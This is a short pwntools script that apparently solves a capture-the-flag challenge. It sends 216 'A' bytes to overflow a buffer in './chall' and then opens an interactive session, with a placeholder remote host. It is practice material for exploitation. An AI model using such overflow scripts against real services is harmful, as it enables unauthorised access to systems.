from pwn import *

# local solve
p = process("./chall")

# remote solve
p = remote("IP", PORT)

# payload 
payload = b'A' * 216

# send payload
p.sendline(payload)
p.interactive()